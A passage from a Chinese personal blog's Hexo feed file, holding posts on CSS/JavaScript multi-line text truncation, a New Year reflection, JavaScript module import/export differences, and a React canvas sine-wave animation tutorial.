<h4 id="核心代码如下"><a href="#核心代码如下" class="headerlink" title="核心代码如下"></a>核心代码如下</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>文本换行处理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  div&#123;</span></span><br><span class="line"><span class="undefined">    position: relative;</span></span><br><span class="line"><span class="undefined">    overflow: hidden;</span></span><br><span class="line"><span class="undefined">    text-overflow: ellipsis;</span></span><br><span class="line"><span class="undefined">    -webkit-line-clamp: 2;</span></span><br><span class="line"><span class="undefined">    display: -webkit-box;</span></span><br><span class="line"><span class="undefined">    -webkit-box-orient: vertical;</span></span><br><span class="line"><span class="css">    <span class="comment">/* white-space: nowrap; */</span></span></span><br><span class="line"><span class="css">    <span class="selector-tag">word-break</span>: <span class="selector-tag">break-all</span>;<span class="comment">/* 由于我这里内容时全英文，不加这个属性会被当做一个单词 就不会换行了 */</span></span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"demo"</span>&gt;</span>ajhsfjhasgjkasakjsbhakjsghasghasghkjasghasgjashkghaskjhasjgaskghaghashgaslkghasglhkasjhgakshlgajskghkjashgjasghasjhgsahlgashglasghashagh<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/break2.gif" alt="My Pic"></p>
<h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><ul>
<li>同样是响应式的截断</li>
<li>截断的位置也是刚刚好</li>
</ul>
<h4 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h4><blockquote>
<p>兼容性不够好<br>-webkit-line-clamp 属性只有 WebKit 内核的浏览器才支持</p>
</blockquote>
<h4 id="css伪元素"><a href="#css伪元素" class="headerlink" title="css伪元素"></a>css伪元素</h4><blockquote>
<p>当多行文本肯定会超出的情况下我们可以使用伪元素之固定一个省略号在后面， 具体代码实现如下：</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>文本换行处理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">  p &#123;</span></span><br><span class="line"><span class="undefined">    position: relative;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">line-height</span>: 1<span class="selector-class">.4em</span>;</span></span><br><span class="line"><span class="css">    <span class="comment">/* 3 times the line-height to show 3 lines */</span></span></span><br><span class="line"><span class="css">    <span class="selector-tag">height</span>: 2<span class="selector-class">.8em</span>;</span></span><br><span class="line"><span class="undefined">    overflow: hidden;</span></span><br><span class="line"><span class="undefined">    word-break: break-all;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="css"><span class="selector-tag">p</span><span class="selector-pseudo">::after</span> &#123;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">content</span>: "\02026";<span class="comment">/*...*/</span></span></span><br><span class="line"><span class="undefined">    font-weight: bold;</span></span><br><span class="line"><span class="undefined">    position: absolute;</span></span><br><span class="line"><span class="undefined">    bottom: 0;</span></span><br><span class="line"><span class="undefined">    right: 0;</span></span><br><span class="line"><span class="undefined">    padding: 0 20px 1px 45px;</span></span><br><span class="line"><span class="css">    <span class="selector-tag">background</span><span class="selector-pseudo">:-webkit-linear-gradient(left</span>,<span class="selector-tag">transparent</span>,<span class="selector-id">#fff</span> 55%);</span></span><br><span class="line"><span class="css">    <span class="selector-tag">background</span><span class="selector-pseudo">:-o-linear-gradient(right</span>,<span class="selector-tag">transparent</span>,<span class="selector-id">#fff</span> 55%);</span></span><br><span class="line"><span class="css">    <span class="selector-tag">background</span><span class="selector-pseudo">:-moz-linear-gradient(right</span>,<span class="selector-tag">transparent</span>,<span class="selector-id">#fff</span> 55%);</span></span><br><span class="line"><span class="css">    <span class="selector-tag">background</span><span class="selector-pseudo">:linear-gradient(to</span> <span class="selector-tag">right</span>,<span class="selector-tag">transparent</span>,<span class="selector-id">#fff</span> 55%);</span></span><br><span class="line"><span class="undefined"> </span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>ajhsfjhasgjkasakjsbhakjsghasghasghkjasghasgjashkghaskjhasjgaskghaghashgaslkghasglhkasjhgakshlgajskghkjashgjasghasjhgsahlgashglasghashagh<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/break3.gif" alt="My Pic"></p>
<blockquote>
<p>响应的优缺点也比较的明显<br>优点是无兼容性问题，同时也是响应式的截断<br>缺点是无法识别文字的长短，省略号会一直存在</p>
</blockquote>
<h4 id="利用JS实现"><a href="#利用JS实现" class="headerlink" title="利用JS实现"></a>利用JS实现</h4><blockquote>
<p>js的方法主要是通过行数、字体大小等属性来粗略的计算当前文本长度是否超过了，超过就截断。这种方法当文本中混有英文时省略号的位置会有一定的偏差。具体代码实现如下：</p>
</blockquote>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>文本换行处理<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"demo"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> text = <span class="string">'哈哈静安寺就会发数据噶事噶啥感觉爱好就是赶快回家奥斯卡尬死了个哈斯阿双方均克航空哈撒给按时付款几哈上过课哈萨克阿拉山口噶啥时候几个哈杀手'</span>;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> totalTextLen = text.length;</span></span><br><span class="line"><span class="javascript">  <span class="keyword">const</span> formatStr = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> ele = <span class="built_in">document</span>.getElementsByClassName(<span class="string">'demo'</span>)[<span class="number">0</span>];</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> lineNum = <span class="number">2</span>;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> baseWidth = <span class="built_in">window</span>.getComputedStyle(ele).width;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> baseFontSize = <span class="built_in">window</span>.getComputedStyle(ele).fontSize;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> lineWidth = +baseWidth.slice(<span class="number">0</span>, <span class="number">-2</span>);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="comment">// 所计算的strNum为元素内部一行可容纳的字数(不区分中英文)</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> strNum = <span class="built_in">Math</span>.floor(lineWidth / +baseFontSize.slice(<span class="number">0</span>, <span class="number">-2</span>));</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">let</span> content = <span class="string">''</span>;</span></span><br><span class="line"><span class="undefined">      </span></span><br><span class="line"><span class="javascript">      <span class="comment">// 多行可容纳总字数</span></span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> totalStrNum = <span class="built_in">Math</span>.floor(strNum * lineNum);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> lastIndex = totalStrNum - totalTextLen;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (totalTextLen &gt; totalStrNum) &#123;</span></span><br><span class="line"><span class="javascript">          content = text.slice(<span class="number">0</span>, lastIndex - <span class="number">3</span>).concat(<span class="string">'...'</span>);</span></span><br><span class="line"><span class="javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="undefined">          content = text;</span></span><br><span class="line"><span class="undefined">      &#125;</span></span><br><span class="line"><span class="undefined">      ele.innerHTML = content;</span></span><br><span class="line"><span class="undefined">  &#125;</span></span><br><span class="line"><span class="undefined">  </span></span><br><span class="line"><span class="undefined">  formatStr();</span></span><br><span class="line"><span class="undefined">  </span></span><br><span class="line"><span class="javascript">  <span class="built_in">window</span>.onresize = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line"><span class="undefined">      formatStr();</span></span><br><span class="line"><span class="undefined">  &#125;;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/images/break4.gif" alt="My Pic"></p>
]]></content>
      <categories>
        <category>Css</category>
        <category>JS</category>
      </categories>
      <tags>
        <tag>Css</tag>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>新年总结</title>
    <url>/2018/02/21/%E6%96%B0%E5%B9%B4%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;转眼之间，这个年就过了。反正随着年龄的增长，越来越觉得没有意思。虽然可能见到了很久没见到的亲人，或者是自己小时候的记忆中对自己很好的人。但是现在总有一种说不出的感觉，或许是尴尬、疏远、陌生。<br><a id="more"></a><br>&nbsp;&nbsp;&nbsp;你已经不是小时候的你，而他们也不是当时的他们，每个人身上都发生着巨大的变化。这样看来，真的只有自己的父母、外公外婆、爷爷奶奶才是会不管你长多么大、有什么样的变化，都会始终如一的爱你。也正因为这样我们要多花点时间陪伴我们最亲的人（说起来很容易但是做起来却很难，加油吧）！送上9宫格</p>
<table style="margin-top:-400px;"><br>    <tr><br>        <td><img src="/images/x1.jpg"></td><br>        <td><img src="/images/x2.jpg"></td><br>        <td><img src="/images/x3.jpg"></td><br>    </tr><br>    <tr><br>        <td><img src="/images/x4.jpg"></td><br>        <td><img src="/images/x5.jpg"></td><br>        <td><img src="/images/x6.jpg"></td><br>    </tr><br>    <tr><br>        <td><img src="/images/x7.jpg"></td><br>        <td><img src="/images/x8.jpg"></td><br>        <td><img src="/images/x9.jpg"></td><br>    </tr><br></table>]]></content>
      <categories>
        <category>生活分享</category>
      </categories>
      <tags>
        <tag>-生活 -心情</tag>
      </tags>
  </entry>
  <entry>
    <title>模块的导入导出</title>
    <url>/2019/05/10/%E6%A8%A1%E5%9D%97%E7%9A%84%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;虽然我在平时的编码中，经常会用到模块的导入导出，但对于不同方法的区别了解的还不是很清楚。然后自己就去查了一下，稍微的总结了一些方法，以及它们之间的区别。<br><a id="more"></a></p>
<h3 id="1-导出工具"><a href="#1-导出工具" class="headerlink" title="1 导出工具"></a>1 导出工具</h3><p>我们常用的模块导出方法有module.exports、exports、export、export default。那它们之间的区别是什么呢？<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//1.第一种export default</span></span><br><span class="line"><span class="comment">//a.js</span></span><br><span class="line"><span class="keyword">const</span> Programmer = &#123;<span class="attr">name</span>: <span class="string">'UncleFirefly'</span>,<span class="attr">age</span>:<span class="number">25</span>&#125;</span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Programmer</span><br><span class="line"><span class="comment">//对应的导入</span></span><br><span class="line"><span class="keyword">import</span> Programmer <span class="keyword">from</span> <span class="string">'./a.js'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//2.第二种export</span></span><br><span class="line"><span class="comment">//a.js</span></span><br><span class="line"><span class="keyword">const</span> a = &#123;<span class="attr">name</span>:<span class="string">'sxy'</span>&#125;&#125;</span><br><span class="line"><span class="keyword">const</span> b = &#123;<span class="attr">name</span>:<span class="string">'tcj'</span>&#125;&#125;</span><br><span class="line"><span class="keyword">export</span> &#123;a,b&#125;</span><br><span class="line"><span class="comment">//对应的导入</span></span><br><span class="line"><span class="keyword">import</span> &#123;a,b&#125; <span class="keyword">from</span> <span class="string">'./a.js'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//3.第三种module.exports</span></span><br><span class="line"><span class="comment">//a.js</span></span><br><span class="line"><span class="built_in">module</span>.exports = &#123;<span class="attr">name</span>: <span class="string">'萤火虫叔叔'</span>&#125;；</span><br><span class="line"><span class="comment">//对应的导入</span></span><br><span class="line"><span class="keyword">let</span> obj = <span class="built_in">require</span>(<span class="string">'./a.js'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">//4.第四种exports</span></span><br><span class="line"><span class="comment">//a.js</span></span><br><span class="line">exports = &#123;<span class="attr">name</span>: <span class="string">'萤火虫叔叔'</span>&#125;；</span><br><span class="line"><span class="comment">//对应的导入</span></span><br><span class="line"><span class="keyword">let</span> obj = <span class="built_in">require</span>(<span class="string">'./a.js'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">后两个的区别 通过打印module对象 它们两个都是空对象，其实它们是指向同一块内存，它们基本上是等价的。但是由于require引入的对象本质是module.exports，当module.exports和exports指向的不是同一块内存时，exports导出的内容会失效</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">前两个的区别 通过打印module对比发现</span></span><br><span class="line"><span class="comment">export default</span></span><br><span class="line"><span class="comment">&#123;exports: &#123;default:&#123;age:25,name:'UncleFirefly'&#125;, hot:&#123;...&#125;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">export</span></span><br><span class="line"><span class="comment">&#123;exports: &#123;aunt:&#123;age:25,name:'AuntFirefly'&#125;,uncle:&#123;age:25,name:'UncleFirefly'&#125;, hot:&#123;...&#125;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">可以发现两个都是向exports对象中添加对象，只是export default 会把键名设置为default</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">导入时：不带&#123;&#125;的导入</span></span><br><span class="line"><span class="comment">本质上就是导入exports中的default属性（注：如果default属性不存在，则导入exports对象）。带&#123;&#125;的导入</span></span><br><span class="line"><span class="comment">本质上按照属性key值导入exports中对应的属性值。</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p>
<h3 id="2-导入工具"><a href="#2-导入工具" class="headerlink" title="2.导入工具"></a>2.导入工具</h3><p>我们使用的导入工具通常有import 和 require，一般来说，module.exports和exports与require对应。也就是用module.exports和exports导出的模块，则用require导入。（不是绝对，如果代码支持es6，也可以用import引入）。</p>
<p><a href="%3Ca href=&quot;https://www.jianshu.com/p/f6c5a646c00b&quot;%3Ehttps://www.jianshu.com/p/f6c5a646c00b%3C/a%3E">module.exports和exports和export和export default的区别，import和require的区别</a></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>正弦函数在动画中的运用(一)</title>
    <url>/2019/11/03/%E6%AD%A3%E5%BC%A6%E5%87%BD%E6%95%B0%E5%9C%A8%E5%8A%A8%E7%94%BB%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8-%E4%B8%80/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;最近看了几篇关于正弦函数如何实现一些比较常用和酷炫的动画效果，自己看了之后也下定决心要把很久没用的canvas给捡回来。下面就通过几个例子来简单介绍一下正弦在动画中的实现，例子都是通过react编写。<br><a id="more"></a></p>
<h3 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h3><blockquote>
<p>这个大家应该都不陌生了，从小到大一直都和它纠缠在一起，只是不知道现在是否有遗忘了，反正我是忘了很多了，就先复习一下吧</p>
</blockquote>
<h4 id="勾股定理"><a href="#勾股定理" class="headerlink" title="勾股定理"></a>勾股定理</h4><blockquote>
<p>对于直角三角形来说 a^2 + b^2 = h^2<br>除此之外还有一下特性<br>sinθ = a / h<br>cosθ = b / h<br>tanθ = a / b</p>
<p><img src="/images/sin1.png" alt="My Pic"></p>
</blockquote>
<h4 id="极坐标系和单位圆"><a href="#极坐标系和单位圆" class="headerlink" title="极坐标系和单位圆"></a>极坐标系和单位圆</h4><blockquote>
<p>重新复习的时候，感觉又回到了很痛苦的日子0.0<br>定义： 在笛卡尔直角坐标系中，任一点 (x, y) 都可以转化成极坐标表示 (r, θ)，其中<br>r = Math.sqrt(x^2 + y^2)<br>θ = Math.atn2(y, x)<br>单位圆的定义是半径为单位长度的圆，圆上任意一点的横坐标就是对应角度的余弦值，任意点的纵坐标就是对应角度的正弦值。下面是网上盗的一张图</p>
<p><img src="/images/sin2.gif" alt="My Pic"></p>
</blockquote>
<h4 id="正弦函数"><a href="#正弦函数" class="headerlink" title="正弦函数"></a>正弦函数</h4><blockquote>
<p>下面首先是一张标准的正弦图</p>
<p><img src="/images/sin3.png" alt="My Pic"><br>然后我们在来看看正弦函数对应的标准表达式吧<br>y = A sin(Bx + C) + D<br>A: 代表振幅 即代表正弦函数的波峰和波谷的最大高度<br>B: 控制着正弦函数的周期  b越小则周期越长 反之越短 代表周期缩短增大了1/b<br>C: 代表初项 即正弦函数在x轴上移动的距离 为正则图像左移 反之右移<br>D: 控制图像的上下移动 为正的话则上移 反之下移<br>这个公式对于后面动画的编写那是非常的重要呀</p>
</blockquote>
<h3 id="波浪曲线动画"><a href="#波浪曲线动画" class="headerlink" title="波浪曲线动画"></a>波浪曲线动画</h3><blockquote>
<p>最终实现的效果是下面这样的<br>主要分为下面的几步来实现</p>
<p><img src="/images/sin4.gif" alt="My Pic"></p>
</blockquote>
<h4 id="画一个正弦曲线"><a href="#画一个正弦曲线" class="headerlink" title="画一个正弦曲线"></a>画一个正弦曲线</h4><blockquote>
<p>主要是利用我们上一个公式 加上创建一个canvas 代码如下：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Demo</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  <span class="keyword">constructor</span> (props) &#123;</span><br><span class="line">    <span class="keyword">super</span>(props)</span><br><span class="line">  &#125;</span><br><span class="line">  componentDidMount () &#123;</span><br><span class="line">    <span class="keyword">const</span> canvas = <span class="keyword">this</span>.refs.canvas;</span><br><span class="line">    canvas.height = <span class="number">500</span>;</span><br><span class="line">    canvas.width = <span class="number">350</span>;</span><br><span class="line">    <span class="keyword">this</span>.canvas = canvas;</span><br><span class="line">    <span class="keyword">this</span>.canvasWidth = canvas.width;</span><br><span class="line">    <span class="keyword">this</span>.canvasHeight = canvas.height;</span><br><span class="line">    <span class="keyword">this</span>.ctx = <span class="keyword">this</span>.canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">    <span class="keyword">this</span>.draw()</span><br><span class="line">  &#125;</span><br><span class="line">  draw () &#123;</span><br><span class="line">    <span class="keyword">this</span>.ctx.beginPath();</span><br><span class="line">    <span class="keyword">this</span>.ctx.lineWidth = <span class="number">1</span></span><br><span class="line">    <span class="keyword">this</span>.ctx.strokeStyle = <span class="string">'#fff'</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; <span class="keyword">this</span>.canvasWidth; x++) &#123;</span><br><span class="line">      <span class="keyword">const</span> y = <span class="number">30</span>* <span class="built_in">Math</span>.sin(x * <span class="built_in">Math</span>.PI / <span class="number">30</span>)  * <span class="number">1</span> + <span class="keyword">this</span>.canvasHeight / <span class="number">2</span></span><br><span class="line">      <span class="keyword">this</span>.ctx.lineTo(x, y)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.ctx.stroke()</span><br><span class="line">    <span class="keyword">this</span>.ctx.closePath()</span><br><span class="line">  &#125;</span><br><span class="line">  render () &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;div className=<span class="string">"demo"</span>&gt;</span><br><span class="line">        &lt;canvas ref=<span class="string">"canvas"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span></span><br><span class="line">      &lt;<span class="regexp">/div&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/images/sin5.png" alt="My Pic"></p>
<h4 id="如何让它动起来"><a href="#如何让它动起来" class="headerlink" title="如何让它动起来"></a>如何让它动起来</h4><blockquote>
<p>这里主要是利用的requestAnimationFrame来重新渲染的，但是要动起来还需要我们不断的修改正弦函数的相位周期等参数来实现 下面主要是通过修改相位来实现移动的</p>
<p>其中clearRect方法我们每次重新画的时候都需要清空当前的画布要不然每次的结果都会就在画布上<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">componentDidMount () &#123;</span><br><span class="line">    <span class="keyword">const</span> canvas = <span class="keyword">this</span>.refs.canvas;</span><br><span class="line">    canvas.height = <span class="number">500</span>;</span><br><span class="line">    canvas.width = <span class="number">350</span>;</span><br><span class="line">    <span class="keyword">this</span>.canvas = canvas;</span><br><span class="line">    <span class="keyword">this</span>.canvasWidth = canvas.width;</span><br><span class="line">    <span class="keyword">this</span>.canvasHeight = canvas.height;</span><br><span class="line">    <span class="keyword">this</span>.ctx = <span class="keyword">this</span>.canvas.getContext(<span class="string">'2d'</span>);</span><br><span class="line">    <span class="keyword">this</span>.moveX = <span class="number">0</span></span><br><span class="line">    requestAnimationFrame(<span class="keyword">this</span>.drawImg.bind(<span class="keyword">this</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  drawImg () &#123;</span><br><span class="line">    <span class="keyword">this</span>.moveX += <span class="number">100</span></span><br><span class="line">    <span class="keyword">this</span>.ctx.clearRect(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>.canvasWidth, <span class="keyword">this</span>.canvasHeight);</span><br><span class="line">    <span class="keyword">this</span>.draw()</span><br><span class="line">    requestAnimationFrame(<span class="keyword">this</span>.drawImg.bind(<span class="keyword">this</span>))</span><br><span class="line">  &#125;</span><br><span class="line">  draw () &#123;</span><br><span class="line">    <span class="keyword">this</span>.ctx.beginPath();</span><br><span class="line">    <span class="keyword">this</span>.ctx.lineWidth = <span class="number">1</span></span><br><span class="line">    <span class="keyword">this</span>.ctx.strokeStyle = <span class="string">'#fff'</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; <span class="keyword">this</span>.canvasWidth; x++) &#123;</span><br><span class="line">      <span class="keyword">const</span> y = <span class="number">30</span>* <span class="built_in">Math</span>.sin(x * <span class="built_in">Math</span>.PI / <span class="number">30</span> + <span class="keyword">this</span>.moveX)  * <span class="number">1</span> + <span class="keyword">this</span>.canvasHeight / <span class="number">2</span></span><br><span class="line">      <span class="keyword">this</span>.ctx.lineTo(x, y)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">this</span>.ctx.stroke()</span><br><span class="line">    <span class="keyword">this</span>.ctx.closePath()</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/images/sin6.gif" alt="My Pic"></p>
<h4 id="再添加一条曲线"><a href="#再添加一条曲线" class="headerlink" title="再添加一条曲线"></a>再添加一条曲线</h4><blockquote>
<p>按照上面的步骤，再添加一条曲线，修改其相位就会出现两条不同速度的曲线了</p>
</blockquote>
<p><img src="/images/sin7.gif" alt="My Pic"></p>
<h4 id="最终实现"><a href="#最终实现" class="headerlink" title="最终实现"></a>最终实现</h4><blockquote>
<p>要实现上面的变化，除了动态修改振幅之外还需要动态修改一些其他的参数，如振幅等 让左右成为波谷，中间成为波峰，就能得到曼妙的波纹   主要是利用下面</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> x = <span class="number">0</span>; x &lt; width; x++) &#123;</span><br><span class="line">  <span class="keyword">const</span> radians = x / width * <span class="built_in">Math</span>.PI * <span class="number">2</span></span><br><span class="line">  <span class="keyword">const</span> scale = (<span class="built_in">Math</span>.sin(radians - <span class="built_in">Math</span>.PI * <span class="number">0.5</span>) + <span class="number">1</span>) * <span class="number">0.5</span></span><br><span class="line">  <span class="keyword">const</span> y = <span class="built_in">Math</span>.sin(x * <span class="number">0.02</span> + xSpeed) * amplitude * scale</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>xSpeed和amplitude为外部传入的， 一个控制振幅，一个控制相位  关于这段控制的代码大家可以自己琢磨一下 也可以自己写写看</p>
<p>在给曲线添加一点渐变的颜色<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> grad = <span class="keyword">this</span>.ctx.createLinearGradient(<span class="number">0</span>, <span class="number">0</span>, <span class="keyword">this</span>.canvasWidth, <span class="number">0</span>); <span class="comment">//创建渐变 初始坐标到终点坐标</span></span><br><span class="line">grad.addColorStop(<span class="number">0</span>, <span class="string">'red'</span>);</span><br><span class="line">grad.addColorStop(<span class="number">1</span>, <span class="string">'#fff'</span>);</span><br><span class="line"><span class="keyword">this</span>.ctx.strokeStyle = grad</span><br></pre></td></tr></table></figure></p>
</blockquote>
<p><img src="/images/sin8.gif" alt="My Pic"></p>
]]></content>
      <categories>
        <category>Canvas</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>Canvas</tag>
        <tag>正弦函数</tag>
      </tags>
  </entry>
  <entry>
    <title>正弦函数在动画中的运用(二)</title>
    <url>/2019/12/13/%E6%AD%A3%E5%BC%A6%E5%87%BD%E6%95%B0%E5%9C%A8%E5%8A%A8%E7%94%BB%E4%B8%AD%E7%9A%84%E8%BF%90%E7%94%A8-%E4%BA%8C/</url>
